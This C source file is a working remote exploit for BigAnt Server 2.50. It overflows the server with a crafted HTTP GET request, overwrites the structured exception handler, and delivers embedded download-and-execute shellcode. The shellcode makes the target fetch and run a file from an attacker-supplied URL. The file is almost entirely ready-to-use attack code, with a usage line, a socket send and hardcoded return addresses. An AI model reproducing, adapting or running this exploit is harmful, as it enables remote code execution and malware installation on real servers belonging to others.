#include <stdio.h>
#include <winsock2.h>

/* BigAnt Server 2.50 SEH Overwrite
Author: Bull Moose
Date: 2/20/2010

[IP] = I.P. Address of BigAnt Server
[Port] = Port
[URL] = URL to file to download and execute on server
*/

// Download & Exec Shellcode
unsigned char Shellcode[500] = 
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";
static const char NextSEH[] = "\xeb\x06\x90\x90";
static const char SEH[] = "\xc3\x20\xc4\x6b";
static const char NOPSled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

static void Usage(void *p);
BOOL main(int argc, char *argv[])
{
    if(argc!=4) Usage(argv[0]);
    
    strcat(Shellcode,argv[3]);
    unsigned char Payload[986];
    memset(Payload,'\x41',985);
    
    unsigned char Buffer[1500];
    sprintf(Buffer,"GET %s%s%s%s%s\r\n\r\n",
    Payload,NextSEH,SEH,NOPSled,Shellcode);
    
    WSADATA wData;
    if(WSAStartup(MAKEWORD(2,2),&wData)!=0) {
        printf("WSAStartup failed to initialize.\n");
        return TRUE;
    }
    SOCKET s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    struct sockaddr_in si;
    si.sin_family = AF_INET;
    si.sin_port = htons(atoi(argv[2]));
    si.sin_addr.s_addr = inet_addr(argv[1]);
    if(connect(s,(SOCKADDR*)&si,sizeof(si))==SOCKET_ERROR) {
        printf("Could not connect to %s on port %d.\n",argv[1],atoi(argv[2]));
        return 1;
    }
    if(send(s,Buffer,strlen(Buffer),0)==SOCKET_ERROR) {
        printf("Failed to send exploit to %s on port %d.\n",argv[1],atoi(argv[2]));
        return 1;
    }
    closesocket(s);
    printf("Exploit successfully sent to %s on port %d.\n",argv[1],atoi(argv[2]));
    return FALSE;
}

static void Usage(void *p)
{
       printf("Usage: %s [IP] [Port] [URL]\n",p);
       ExitProcess(TRUE);
}
